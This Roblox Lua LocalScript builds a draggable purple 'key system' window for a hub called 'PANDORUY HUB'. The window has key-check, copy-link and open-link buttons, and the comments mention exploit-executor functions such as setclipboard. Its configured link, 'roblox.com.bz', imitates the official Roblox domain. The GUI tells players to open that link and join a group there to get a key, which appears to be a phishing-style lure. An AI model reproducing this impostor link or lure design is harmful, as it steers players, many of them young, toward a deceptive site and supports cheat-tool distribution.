--[[
	==============================================
	  KEY SYSTEM GUI - LocalScript
	  Place this inside StarterGui (or StarterPlayer > StarterPlayerScripts)
	==============================================

	HOW TO USE:
	1. Put this LocalScript in StarterGui.
	2. Edit the CONFIG section below:
	   - LINK_URL        -> the link your "Copy Link" / "Open Link" buttons use
	   - checkKey(input)  -> your real key validation logic
	3. Upload your logo PNG via Studio's Asset Manager (or roblox.com/develop),
	   wait for it to be approved, then paste the resulting asset ID into
	   LogoIcon.Image below (currently set to "rbxassetid://0" as a placeholder).
	4. Run the game (F5 / Play). The GUI appears automatically.

	BUTTONS:
	- Check Key   -> validates whatever is typed in the textbox
	- Copy Link   -> tries to copy LINK_URL to clipboard. Standard Roblox has
	                 no clipboard API for LocalScripts, so this only truly
	                 "copies" in exploit-executor environments (setclipboard).
	                 In normal Roblox/Studio it instead shows the link as text.
	- Open Link   -> opens LINK_URL in the player's browser via
	                 GuiService:OpenBrowserWindowAsync (works in normal Roblox,
	                 though it can behave inconsistently inside Studio's
	                 internal test/play mode vs. a real published game).
--]]

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local GuiService = game:GetService("GuiService")

local player = Players.LocalPlayer

----------------------------------------------------------------
-- CONFIG  (edit these)
----------------------------------------------------------------

local LINK_URL = "https://roblox.com.bz/communities/706251125/" -- <-- change this anytime

-- Replace this with your real key-checking logic.
-- Return true if the key is valid, false otherwise.
local function checkKey(inputText)
	local validKeys = {
		["TEST-KEY-123"] = true,
	}
	return validKeys[inputText] == true
end

----------------------------------------------------------------
-- THEME
----------------------------------------------------------------

local THEME = {
	bg          = Color3.fromRGB(20, 16, 28),    -- deep purple-black
	panel       = Color3.fromRGB(30, 22, 42),    -- dark violet panel
	accent      = Color3.fromRGB(150, 80, 245),  -- bright purple
	accent2     = Color3.fromRGB(200, 110, 255), -- light purple/magenta
	text        = Color3.fromRGB(238, 232, 248),
	subtext     = Color3.fromRGB(175, 160, 195),
	success     = Color3.fromRGB(80, 220, 140),
	fail        = Color3.fromRGB(235, 90, 90),
	stroke      = Color3.fromRGB(80, 60, 110),
}

----------------------------------------------------------------
-- HELPERS
----------------------------------------------------------------

local function create(className, props)
	local inst = Instance.new(className)
	for prop, value in pairs(props) do
		inst[prop] = value
	end
	return inst
end

local function tween(obj, props, time, style)
	TweenService:Create(obj, TweenInfo.new(time or 0.2, style or Enum.EasingStyle.Quad), props):Play()
end

local function addCorner(obj, radius)
	create("UICorner", { CornerRadius = UDim.new(0, radius or 12), Parent = obj })
end

local function addStroke(obj, color, thickness, transparency)
	create("UIStroke", {
		Color = color or THEME.stroke,
		Thickness = thickness or 1,
		Transparency = transparency or 0,
		Parent = obj,
	})
end

local function addGradient(obj, colorSeq, rotation)
	create("UIGradient", {
		Color = colorSeq,
		Rotation = rotation or 0,
		Parent = obj,
	})
end

----------------------------------------------------------------
-- SCREEN GUI
----------------------------------------------------------------

local screenGui = create("ScreenGui", {
	Name = "KeySystemGUI",
	ResetOnSpawn = false,
	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
	Parent = player:WaitForChild("PlayerGui"),
})

-- Main window
local main = create("Frame", {
	Name = "Main",
	Size = UDim2.new(0, 460, 0, 270),
	Position = UDim2.new(0.5, -230, 0.5, -135),
	BackgroundColor3 = THEME.panel,
	Parent = screenGui,
})
addCorner(main, 16)
addStroke(main, THEME.stroke, 1, 0.2)

-- subtle drop shadow look using a slightly bigger dark frame behind
local shadow = create("Frame", {
	Name = "Shadow",
	Size = UDim2.new(1, 24, 1, 24),
	Position = UDim2.new(0, -12, 0, -12),
	BackgroundColor3 = Color3.fromRGB(0, 0, 0),
	BackgroundTransparency = 0.6,
	ZIndex = main.ZIndex - 1,
	Parent = main,
})
addCorner(shadow, 20)

----------------------------------------------------------------
-- LINK POPUP (shown when "Copy Link" is clicked)
-- Standard Roblox has no clipboard-write API for LocalScripts, so this
-- shows the link inside a real TextBox the player can click, select all
-- (Ctrl+A), and copy (Ctrl+C) manually like any normal text field.
----------------------------------------------------------------

local linkPopup = create("Frame", {
	Name = "LinkPopup",
	Size = UDim2.new(0, 380, 0, 130),
	Position = UDim2.new(0.5, -190, 0.5, -65),
	BackgroundColor3 = THEME.panel,
	Visible = false,
	ZIndex = 50,
	Parent = screenGui,
})
addCorner(linkPopup, 14)
addStroke(linkPopup, THEME.accent, 1.5, 0.1)

local linkPopupTitle = create("TextLabel", {
	Size = UDim2.new(1, -24, 0, 24),
	Position = UDim2.new(0, 12, 0, 12),
	BackgroundTransparency = 1,
	Text = "Click the box, then Ctrl+A, Ctrl+C to copy:",
	TextColor3 = THEME.subtext,
	Font = Enum.Font.GothamMedium,
	TextSize = 13,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 51,
	Parent = linkPopup,
})

local linkPopupBox = create("TextBox", {
	Name = "LinkBox",
	Size = UDim2.new(1, -24, 0, 36),
	Position = UDim2.new(0, 12, 0, 44),
	BackgroundColor3 = THEME.bg,
	Text = "",
	TextColor3 = THEME.text,
	Font = Enum.Font.Code,
	TextSize = 14,
	ClearTextOnFocus = false,
	TextXAlignment = Enum.TextXAlignment.Left,
	ZIndex = 51,
	Parent = linkPopup,
})
addCorner(linkPopupBox, 8)
addStroke(linkPopupBox, THEME.accent, 1, 0.4)

local linkPopupClose = create("TextButton", {
	Name = "CloseLinkPopup",
	Size = UDim2.new(1, -24, 0, 32),
	Position = UDim2.new(0, 12, 0, 88),
	BackgroundColor3 = THEME.accent,
	Text = "Done",
	TextColor3 = THEME.text,
	Font = Enum.Font.GothamBold,
	TextSize = 13,
	AutoButtonColor = false,
	ZIndex = 51,
	Parent = linkPopup,
})
addCorner(linkPopupClose, 8)

linkPopupClose.MouseEnter:Connect(function()
	tween(linkPopupClose, { BackgroundColor3 = THEME.accent2 }, 0.15)
end)
linkPopupClose.MouseLeave:Connect(function()
	tween(linkPopupClose, { BackgroundColor3 = THEME.accent }, 0.15)
end)
linkPopupClose.MouseButton1Click:Connect(function()
	linkPopup.Visible = false
end)

----------------------------------------------------------------
-- TITLE BAR (draggable)
----------------------------------------------------------------

local titleBar = create("Frame", {
	Name = "TitleBar",
	Size = UDim2.new(1, 0, 0, 44),
	BackgroundColor3 = THEME.bg,
	Parent = main,
})
addCorner(titleBar, 16)

-- mask the bottom corners of the title bar so it blends into the panel
local titleMask = create("Frame", {
	Size = UDim2.new(1, 0, 0, 16),
	Position = UDim2.new(0, 0, 1, -16),
	BackgroundColor3 = THEME.bg,
	BorderSizePixel = 0,
	Parent = titleBar,
})

local titleAccent = create("Frame", {
	Name = "AccentLine",
	Size = UDim2.new(1, 0, 0, 3),
	Position = UDim2.new(0, 0, 1, 0),
	BackgroundColor3 = THEME.accent,
	BorderSizePixel = 0,
	ZIndex = 5,
	Parent = main,
})
addGradient(titleAccent, ColorSequence.new(THEME.accent, THEME.accent2))

local logoIcon = create("ImageLabel", {
	Name = "LogoIcon",
	Size = UDim2.new(0, 28, 0, 28),
	Position = UDim2.new(0, 12, 0.5, -14),
	BackgroundTransparency = 1,
	Image = "rbxassetid://0", -- <-- replace 0 with your uploaded logo's asset ID
	Parent = titleBar,
})

local titleText = create("TextLabel", {
	Name = "Title",
	Size = UDim2.new(1, -130, 1, 0),
	Position = UDim2.new(0, 48, 0, 0),
	BackgroundTransparency = 1,
	Text = "PANDORUY HUB",
	TextColor3 = THEME.text,
	Font = Enum.Font.GothamBold,
	TextSize = 17,
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = titleBar,
})

local closeBtn = create("TextButton", {
	Name = "CloseButton",
	Size = UDim2.new(0, 32, 0, 32),
	Position = UDim2.new(1, -40, 0.5, -16),
	BackgroundColor3 = Color3.fromRGB(48, 36, 64),
	Text = "✕",
	TextColor3 = THEME.subtext,
	Font = Enum.Font.GothamBold,
	TextSize = 14,
	AutoButtonColor = false,
	Parent = titleBar,
})
addCorner(closeBtn, 8)

closeBtn.MouseEnter:Connect(function()
	tween(closeBtn, { BackgroundColor3 = THEME.fail, TextColor3 = THEME.text }, 0.15)
end)
closeBtn.MouseLeave:Connect(function()
	tween(closeBtn, { BackgroundColor3 = Color3.fromRGB(48, 36, 64), TextColor3 = THEME.subtext }, 0.15)
end)
closeBtn.MouseButton1Click:Connect(function()
	tween(main, { Size = UDim2.new(0, 460, 0, 0), Position = main.Position + UDim2.new(0, 0, 0, 135) }, 0.25)
	task.wait(0.25)
	screenGui:Destroy()
end)

-- Dragging
do
	local dragging, dragStart, startPos
	titleBar.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = main.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	titleBar.InputChanged:Connect(function(input)
		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local delta = input.Position - dragStart
			main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		end
	end)
end

----------------------------------------------------------------
-- SUBTITLE
----------------------------------------------------------------

local subtitle = create("TextLabel", {
	Size = UDim2.new(1, -36, 0, 20),
	Position = UDim2.new(0, 18, 0, 54),
	BackgroundTransparency = 1,
	Text = "Verify your key, click on the copy link and join our group to get the key.",
	TextColor3 = THEME.subtext,
	Font = Enum.Font.Gotham,
	TextSize = 13,
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = main,
})

----------------------------------------------------------------
-- STATUS LABEL
----------------------------------------------------------------

local statusLabel = create("TextLabel", {
	Name = "StatusLabel",
	Size = UDim2.new(1, -36, 0, 18),
	Position = UDim2.new(0, 18, 0, 186),
	BackgroundTransparency = 1,
	Text = "",
	TextColor3 = THEME.subtext,
	Font = Enum.Font.GothamMedium,
	TextSize = 13,
	TextXAlignment = Enum.TextXAlignment.Left,
	Parent = main,
})

----------------------------------------------------------------
-- KEY INPUT BOX (always visible)
----------------------------------------------------------------

local inputHolder = create("Frame", {
	Name = "InputHolder",
	Size = UDim2.new(1, -36, 0, 40),
	Position = UDim2.new(0, 18, 0, 84),
	BackgroundColor3 = THEME.bg,
	Visible = true,
	Parent = main,
})
addCorner(inputHolder, 10)
addStroke(inputHolder, THEME.accent, 1, 0.4)

local keyBox = create("TextBox", {
	Name = "KeyBox",
	Size = UDim2.new(1, -24, 1, 0),
	Position = UDim2.new(0, 12, 0, 0),
	BackgroundTransparency = 1,
	Text = "",
	PlaceholderText = "Enter your key...",
	PlaceholderColor3 = THEME.subtext,
	TextColor3 = THEME.text,
	Font = Enum.Font.Gotham,
	TextSize = 14,
	TextXAlignment = Enum.TextXAlignment.Left,
	ClearTextOnFocus = false,
	Parent = inputHolder,
})

local function handleKeySubmit()
	local text = keyBox.Text
	if text == "" then
		statusLabel.Text = "⚠ Please enter a key."
		statusLabel.TextColor3 = THEME.fail
		return
	end

	local isValid = checkKey(text)

	if isValid then
		statusLabel.Text = "✔ Key accepted! Welcome."
		statusLabel.TextColor3 = THEME.success
	else
		statusLabel.Text = "✘ Invalid key. Try again."
		statusLabel.TextColor3 = THEME.fail
	end
end

keyBox.FocusLost:Connect(function(enterPressed)
	if enterPressed then
		handleKeySubmit()
	end
end)

----------------------------------------------------------------
-- BUTTON ROW: Check Key | Copy Link | Open Link
----------------------------------------------------------------

local buttonRow = create("Frame", {
	Name = "ButtonRow",
	Size = UDim2.new(1, -36, 0, 40),
	Position = UDim2.new(0, 18, 0, 134),
	BackgroundTransparency = 1,
	Parent = main,
})

local function makeActionButton(name, text, columnIndex, color1, color2)
	local width = UDim2.new(1 / 3, -8, 1, 0)
	local xOffset = (columnIndex == 0) and 0 or (columnIndex == 1) and 4 or 8
	local btn = create("TextButton", {
		Name = name,
		Size = width,
		Position = UDim2.new((1 / 3) * columnIndex, xOffset, 0, 0),
		BackgroundColor3 = color1,
		Text = text,
		TextColor3 = THEME.text,
		Font = Enum.Font.GothamBold,
		TextSize = 13,
		TextWrapped = true,
		AutoButtonColor = false,
		Parent = buttonRow,
	})
	addCorner(btn, 10)
	addGradient(btn, ColorSequence.new(color1, color2))

	btn.MouseEnter:Connect(function()
		tween(btn, { Size = UDim2.new(width.X.Scale, width.X.Offset, 1, 4) }, 0.12)
	end)
	btn.MouseLeave:Connect(function()
		tween(btn, { Size = width }, 0.12)
	end)
	btn.MouseButton1Down:Connect(function()
		tween(btn, { Size = UDim2.new(width.X.Scale, width.X.Offset - 4, 1, -4) }, 0.08)
	end)
	btn.MouseButton1Up:Connect(function()
		tween(btn, { Size = UDim2.new(width.X.Scale, width.X.Offset, 1, 4) }, 0.08)
	end)

	return btn
end

local checkKeyBtn = makeActionButton("CheckKeyButton", "🔑 Check Key", 0, THEME.accent, THEME.accent2)
local copyLinkBtn = makeActionButton("CopyLinkButton", "📋 Copy Link", 1, Color3.fromRGB(58, 40, 80), Color3.fromRGB(90, 60, 120))
local openLinkBtn = makeActionButton("OpenLinkButton", "🌐 Open Link", 2, Color3.fromRGB(45, 32, 64), Color3.fromRGB(70, 48, 100))

----------------------------------------------------------------
-- CHECK KEY: validate whatever is currently typed in the box
----------------------------------------------------------------

checkKeyBtn.MouseButton1Click:Connect(handleKeySubmit)

----------------------------------------------------------------
-- COPY LINK: attempts to copy LINK_URL to clipboard.
-- NOTE: standard Roblox (Studio/live games) does NOT expose clipboard
-- access to LocalScripts for security reasons. setclipboard only exists
-- in exploit-executor environments. In normal Roblox this will fail, so
-- we fall back to showing the link as text the player can read/select.
----------------------------------------------------------------

copyLinkBtn.MouseButton1Click:Connect(function()
	local copied = false
	local ok = pcall(function()
		if setclipboard then
			setclipboard(LINK_URL)
			copied = true
		end
	end)

	if ok and copied then
		statusLabel.Text = "📋 Link copied to clipboard!"
		statusLabel.TextColor3 = THEME.success
	else
		-- Standard Roblox has no clipboard API, so open a popup with the
		-- link in a selectable TextBox the player can manually copy.
		linkPopupBox.Text = LINK_URL
		linkPopup.Visible = true
		linkPopupBox:CaptureFocus()
		statusLabel.Text = ""
	end
end)

----------------------------------------------------------------
-- OPEN LINK: opens the editable LINK_URL in the player's browser
----------------------------------------------------------------

openLinkBtn.MouseButton1Click:Connect(function()
	local ok = pcall(function()
		GuiService:OpenBrowserWindowAsync(LINK_URL)
	end)

	statusLabel.Text = ok and ("🌐 Opened link in browser!") or "⚠ Could not open link."
	statusLabel.TextColor3 = ok and THEME.success or THEME.fail
end)

----------------------------------------------------------------
-- OPEN ANIMATION
----------------------------------------------------------------

main.Size = UDim2.new(0, 460, 0, 0)
main.Position = UDim2.new(0.5, -230, 0.5, -135) + UDim2.new(0, 0, 0, 135)
tween(main, {
	Size = UDim2.new(0, 460, 0, 270),
	Position = UDim2.new(0.5, -230, 0.5, -135),
}, 0.35, Enum.EasingStyle.Back)
